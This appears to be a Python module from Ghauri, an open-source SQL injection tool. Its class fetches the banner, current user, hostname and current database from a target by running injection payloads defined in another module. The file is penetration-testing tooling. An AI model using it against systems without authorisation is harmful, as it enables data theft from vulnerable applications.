#!/usr/bin/python3
# -*- coding: utf-8 -*-
# pylint: disable=R,W,E,C

"""

Author  : Nasir Khan (r0ot h3x49)
Github  : https://github.com/r0oth3x49
License : MIT


Copyright (c) 2016-2025 Nasir Khan (r0ot h3x49)

Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the "Software"), to deal in the
Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software,
and to permit persons to whom the Software is furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF
MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR
ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH 
THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.

"""
import random
from ghauri.common.config import conf
from ghauri.common.session import session
from ghauri.core.extract import ghauri_extractor
from ghauri.logger.colored_logger import logger
from ghauri.common.payloads import (
    PAYLOADS_BANNER,
    PAYLOADS_CURRENT_USER,
    PAYLOADS_CURRENT_DATABASE,
    PAYLOADS_DBS_COUNT,
    PAYLOADS_TBLS_COUNT,
    PAYLOADS_COLS_COUNT,
    PAYLOADS_RECS_COUNT,
    PAYLOADS_HOSTNAME,
)

from ghauri.common.lib import collections


class GhauriCommon:
    """This class will be used to fetch common thing like database, user, version"""

    def fetch_banner(
        self,
        url,
        data,
        vector,
        parameter,
        headers,
        base,
        injection_type,
        backend="",
        proxy=None,
        is_multipart=False,
        timeout=30,
        delay=0,
        timesec=5,
        attack=None,
        match_string=None,
        not_match_string=None,
        code=None,
        text_only=False,
    ):
        logger.info("fetching banner")
        Response = collections.namedtuple(
            "Response",
            ["ok", "error", "result", "payload"],
        )
        guess = ghauri_extractor.fetch_characters(
            url=url,
            data=data,
            vector=vector,
            parameter=parameter,
            headers=headers,
            base=base,
            injection_type=injection_type,
            payloads=PAYLOADS_BANNER.get(backend),
            backend=backend,
            proxy=proxy,
            is_multipart=is_multipart,
            timeout=timeout,
            delay=delay,
            timesec=timesec,
            attack01=attack,
            match_string=match_string,
            not_match_string=not_match_string,
            code=code,
            query_check=True,
            text_only=text_only,
        )
        if guess.ok:
            logger.debug(f"working payload found: '{guess.payload}'")
            retval = ghauri_extractor.fetch_characters(
                url=url,
                data=data,
                vector=vector,
                parameter=parameter,
                headers=headers,
                base=base,
                injection_type=injection_type,
                payloads=[guess.payload],
                backend=backend,
                proxy=proxy,
                is_multipart=is_multipart,
                timeout=timeout,
                delay=delay,
                timesec=timesec,
                attack01=attack,
                match_string=match_string,
                not_match_string=not_match_string,
                code=code,
                text_only=text_only,
                dump_type="banner",
            )
            if retval.ok:
                if retval.resumed:
                    logger.info("resumed: '%s'" % (retval.result))
                else:
                    logger.info("retrieved: '%s'" % (retval.result))
                logger.success(f"banner: '{retval.result}'")
            else:
                error = retval.error
                if error:
                    message = (
                        f"Ghauri detected an error during banner extraction ({error})"
                    )
                    logger.warning(f"{message}")
                logger.end("ending")
                exit(0)
        else:
            retval = guess
        return retval

    def fetch_current_user(
        self,
        url,
        data,
        vector,
        parameter,
        headers,
        base,
        injection_type,
        backend="",
        proxy=None,
        is_multipart=False,
        timeout=30,
        delay=0,
        timesec=5,
        attack=None,
        match_string=None,
        not_match_string=None,
        code=None,
        text_only=False,
    ):
        logger.info("fetching current user")
        Response = collections.namedtuple(
            "Response",
            ["ok", "error", "result", "payload"],
        )
        guess = ghauri_extractor.fetch_characters(
            url=url,
            data=data,
            vector=vector,
            parameter=parameter,
            headers=headers,
            base=base,
            injection_type=injection_type,
            payloads=PAYLOADS_CURRENT_USER.get(backend),
            backend=backend,
            proxy=proxy,
            is_multipart=is_multipart,
            timeout=timeout,
            delay=delay,
            timesec=timesec,
            attack01=attack,
            match_string=match_string,
            not_match_string=not_match_string,
            code=code,
            query_check=True,
            text_only=text_only,
        )
        if guess.ok:
            logger.debug(f"working payload found: '{guess.payload}'")
            retval = ghauri_extractor.fetch_characters(
                url=url,
                data=data,
                vector=vector,
                parameter=parameter,
                headers=headers,
                base=base,
                injection_type=injection_type,
                payloads=[guess.payload],
                backend=backend,
                proxy=proxy,
                is_multipart=is_multipart,
                timeout=timeout,
                delay=delay,
                timesec=timesec,
                attack01=attack,
                match_string=match_string,
                not_match_string=not_match_string,
                code=code,
                text_only=text_only,
                dump_type="current_user",
            )
            if retval.ok:
                if retval.resumed:
                    logger.info("resumed: '%s'" % (retval.result))
                else:
                    logger.info("retrieved: '%s'" % (retval.result))
                logger.success(f"current user: '{retval.result}'")
            else:
                error = retval.error
                if error:
                    message = f"Ghauri detected an error during current user extraction ({error})"
                    logger.warning(f"{message}")
                logger.end("ending")
                exit(0)
        else:
            retval = guess
        return retval

    def fetch_hostname(
        self,
        url,
        data,
        vector,
        parameter,
        headers,
        base,
        injection_type,
        backend="",
        proxy=None,
        is_multipart=False,
        timeout=30,
        delay=0,
        timesec=5,
        attack=None,
        match_string=None,
        not_match_string=None,
        code=None,
        text_only=False,
    ):
        logger.info("fetching hostname")
        Response = collections.namedtuple(
            "Response",
            ["ok", "error", "result", "payload"],
        )
        guess = ghauri_extractor.fetch_characters(
            url=url,
            data=data,
            vector=vector,
            parameter=parameter,
            headers=headers,
            base=base,
            injection_type=injection_type,
            payloads=PAYLOADS_HOSTNAME.get(backend),
            backend=backend,
            proxy=proxy,
            is_multipart=is_multipart,
            timeout=timeout,
            delay=delay,
            timesec=timesec,
            attack01=attack,
            match_string=match_string,
            not_match_string=not_match_string,
            code=code,
            query_check=True,
            text_only=text_only,
        )
        if guess.ok:
            logger.debug(f"working payload found: '{guess.payload}'")
            retval = ghauri_extractor.fetch_characters(
                url=url,
                data=data,
                vector=vector,
                parameter=parameter,
                headers=headers,
                base=base,
                injection_type=injection_type,
                payloads=[guess.payload],
                backend=backend,
                proxy=proxy,
                is_multipart=is_multipart,
                timeout=timeout,
                delay=delay,
                timesec=timesec,
                attack01=attack,
                match_string=match_string,
                not_match_string=not_match_string,
                code=code,
                text_only=text_only,
                dump_type="hostname",
            )
            if retval.ok:
                if retval.resumed:
                    logger.info("resumed: '%s'" % (retval.result))
                else:
                    logger.info("retrieved: '%s'" % (retval.result))
                logger.success(f"hostname: '{retval.result}'")
            else:
                error = retval.error
                if error:
                    message = f"Ghauri detected an error during current user extraction ({error})"
                    logger.warning(f"{message}")
                logger.end("ending")
                exit(0)
        else:
            retval = guess
        return retval

    def fetch_current_database(
        self,
        url,
        data,
        vector,
        parameter,
        headers,
        base,
        injection_type,
        backend="",
        proxy=None,
        is_multipart=False,
        timeout=30,
        delay=0,
        timesec=5,
        attack=None,
        match_string=None,
        not_match_string=None,
        code=None,
        text_only=False,
    ):
        logger.info("fetching current database")
        Response = collections.namedtuple(
            "Response",
            ["ok", "error", "result", "payload"],
        )
        guess = ghauri_extractor.fetch_characters(
            url=url,
            data=data,
            vector=vector,
            parameter=parameter,
            headers=headers,
            base=base,
            injection_type=injection_type,
            payloads=PAYLOADS_CURRENT_DATABASE.get(backend),
            backend=backend,
            proxy=proxy,
            is_multipart=is_multipart,
            timeout=timeout,
            delay=delay,
            timesec=timesec,
            attack01=attack,
            match_string=match_string,
            not_match_string=not_match_string,
            code=code,
            text_only=text_only,
            query_check=True,
        )
        if guess.ok:
            logger.debug(f"working payload found: '{guess.payload}'")
            retval = ghauri_extractor.fetch_characters(
                url=url,
                data=data,
                vector=vector,
                parameter=parameter,
                headers=headers,
                base=base,
                injection_type=injection_type,
                payloads=[guess.payload],
                backend=backend,
                proxy=proxy,
                is_multipart=is_multipart,
                timeout=timeout,
                delay=delay,
                timesec=timesec,
                attack01=attack,
                match_string=match_string,
                not_match_string=not_match_string,
                code=code,
                text_only=text_only,
                dump_type="current_db",
            )
            if retval.ok:
                if retval.resumed:
                    logger.info("resumed: '%s'" % (retval.result))
                else:
                    logger.info("retrieved: '%s'" % (retval.result))
                logger.success(f"current database: '{retval.result}'")
            else:
                error = retval.error
                if error:
                    message = f"Ghauri detected an error during current database extraction ({error})"
                    logger.warning(f"{message}")
                logger.end("ending")
                exit(0)
        else:
            retval = guess
        return retval


target = GhauriCommon()
